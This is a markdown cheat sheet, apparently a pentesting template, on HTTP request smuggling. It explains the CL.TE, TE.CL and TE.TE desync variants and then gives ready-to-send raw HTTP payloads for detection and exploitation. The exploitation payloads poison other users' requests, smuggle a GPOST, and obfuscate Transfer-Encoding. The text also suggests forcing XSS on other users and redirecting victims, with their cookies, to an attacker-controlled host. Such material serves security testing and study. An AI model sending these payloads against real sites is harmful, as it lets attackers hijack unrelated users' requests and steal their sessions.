title: Request Smuggling
description: HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.

## What happens in an HTTP request smuggling attack?

Today's web applications frequently employ chains of HTTP servers between users and the ultimate application logic. Users send requests to a front-end server (sometimes called a load balancer or reverse proxy) and this server forwards requests to one or more back-end servers. This type of architecture is increasingly common, and in some cases unavoidable, in modern cloud-based applications.

When the front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network connection, because this is much more efficient and performant. The protocol is very simple: HTTP requests are sent one after another, and the receiving server parses the HTTP request headers to determine where one request ends and the next one begins:

![State of the art server-side communication](https://portswigger.net/web-security/images/forwarding-http-requests-to-back-end-server.svg)

In this situation, it is crucial that the front-end and back-end systems agree about the boundaries between requests. Otherwise, an attacker might be able to send an ambiguous request that gets interpreted differently by the front-end and back-end systems:

![Request smuggling attack](https://portswigger.net/web-security/images/smuggling-http-request-to-back-end-server.svg)

Here, the attacker causes part of their front-end request to be interpreted by the back-end server as the start of the next request. It is effectively prepended to the next request, and so can interfere with the way the application processes that request. This is a request smuggling attack, and it can have devastating results.

## Notation

- **CL.TE**: front-end server uses the `Content-Length` header and the back-end server server uses the `Transfer-Encoding` header.
- **TE.CL**: front-end server uses the `Transfer-Encoding` header and the back-end server server uses the `Content-Length` header.
- **TE.TE**: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.


## Detection

Please **FIRST** try detecting **CL.TE** as if it is vulnerable to it, the **TE.CL** detection payload wil poison the socket and cause a lot of harm

### **CL.TE** detection

Send the following request:

```http
POST {{ path /about }} HTTP/1.1
Host: {{ target-domain vulerable.net }}
Transfer-Encoding: chunked
Content-Length: 4

1
Z
Q
```

There is 4 possible outcomes:
 - CL.CL: backend response
 - TE.TE: frontend response
 - TE.CL: frontend response
 - **CL.TE: timeout** (_vulnerable_)

Only after confirming no **CL.TE** desync attacks can be performed you can check the next variant:


### **TE.CL** detection

Send the following request:

```http
POST {{ path /about }} HTTP/1.1
Host: {{ target-domain vulerable.net }}
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

There is 4 possible outcomes:
 - CL.CL: backend response
 - TE.TE: backend response
 - **TE.CL: timeout** (_vulnerable_)
 - _CL.TE: socket poison_ ðŸ’€




## Exploitation


### CL.TE

You can just _poison_ legitimate requests. For example the following request would result on the next user doing a `SMUGGLEDPOST` request:

```http
POST {{ path /about }} HTTP/1.1
Host: {{ target-domain vulerable.net }}
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

You can Actually change other users requests, so you can force them  to execute a XSS for example. It is also common for web proxies to hapily redirect users based on the host header so you could redirect people to your collaborator with their cookies by just specifiying a host header for the users.



### TE.CL


```http
POST {{ path /about }} HTTP/1.1
Host: {{ target-domain vulerable.net }}
Cookie: session=fnJJc90vRfPmIYHB3xmzTYJyhLx5JhGO
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

9d
GPOST / HTTP/1.1
Host: {{ target-domain vulerable.net }}
Content-Type: application/x-www-form-urlencoded
Content-Length: 123

a=
0


```



## TE.TE into CL.TE


```http
POST {{ path /about }} HTTP/1.1
Host: {{ target-domain vulerable.net }}
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: cow
Transfer-Encoding: chunked

0

G
```
